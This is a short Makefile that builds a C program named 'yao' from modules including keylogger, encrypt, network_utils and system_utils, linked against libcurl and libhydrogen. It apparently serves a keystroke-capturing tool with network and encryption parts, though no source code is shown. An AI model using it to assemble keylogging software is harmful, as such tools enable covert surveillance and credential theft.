# FLAGS
CC = gcc
CFLAGS = -c -Wall -Wextra -std=gnu11 -O0 -g
LDLIBS = -lpthread -lcurl $(LIBPATH)libhydrogen.a

TARGET = "yao"

# PATHS
SRCPATH = src/
INCLUDE = include/
OBJPATH = build/
LIBPATH = lib/

OBJECTS = $(OBJPATH)core.o $(OBJPATH)network_utils.o $(OBJPATH)system_utils.o $(OBJPATH)keylogger.o $(OBJPATH)encrypt.o

# EXEC CREATION
$(TARGET): $(OBJPATH) $(OBJPATH) $(OBJECTS)
	@echo -n "Linking objects..."
	@$(CC) $(OBJECTS) -o $@ $(LDLIBS)
	@echo " [OK]"

$(OBJPATH):
	@mkdir $(OBJPATH)

# OBJECT CREATION
$(OBJPATH)%.o: $(SRCPATH)%.c
	@echo -n "Building $@..."
	@$(CC) -I $(INCLUDE) $(CFLAGS) $< -o $@
	@echo " [OK]"

# COMMANDS
all: clean $(TARGET)

valgrind:
	valgrind --leak-check=full --show-leak-kinds=all $(TARGET)

clean:
	@echo -n "Removing objects files..."
	@rm -rf $(OBJPATH) $(TARGET)
	@echo " [OK]"
